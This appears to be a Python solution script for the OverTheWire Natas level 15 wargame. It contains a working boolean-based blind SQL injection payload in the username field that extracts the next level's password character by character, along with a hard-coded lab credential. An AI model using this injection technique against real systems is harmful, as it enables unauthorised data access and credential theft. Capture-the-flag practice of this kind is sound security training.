# import requests
# import re
# from string import ascii_lowercase, ascii_uppercase, digits
# from time import *

# chr =ascii_uppercase+ ascii_lowercase + digits
# usrname= 'natas16'
# pwwd='SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'

# url='http://%s.natas.labs.overthewire.org/' % usrname
# session=requests.Session()

# seen_pwd=list()
# while(len(seen_pwd)<32):
#     for char in chr:
#         s_time=time()
#         print("start")
#         print("Trying with ", "".join(seen_pwd)+char)
#         res=session.post(url,data={"username": 'natas16" And BINARY password LIKE "%' + seen_pwd + '%" "'}, auth=(usrname,pwwd) )
#         cont=res.text
#         e_time=time()
        
#         dif_time=e_time-s_time
#         # if(dif_time>1):
#         if "This user exists" in cont:
#             # print
#             seen_pwd.append(char)
#             break
        


import requests
import re
from string import ascii_lowercase, ascii_uppercase, digits
from time import *

chr =ascii_uppercase+ ascii_lowercase + digits
username= 'natas15'
password='SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'

url='http://%s.natas.labs.overthewire.org/' % username
session=requests.Session()

# res=session.get(url,auth=(username,password))

# print(res.text)

seen_pwd=list('')
while(len(seen_pwd)<=32):
    for char in chr:
        print("Trying with ", "".join(seen_pwd)+char)
        data={"username": 'natas16" AND BINARY password LIKE "' +"".join(seen_pwd) + char +'%" #'}
        res=session.post(url,data=data,auth=(username,password))
        cont=res.text
        if ("user exists" in cont):
            # print
            seen_pwd.append(char)
            break
        
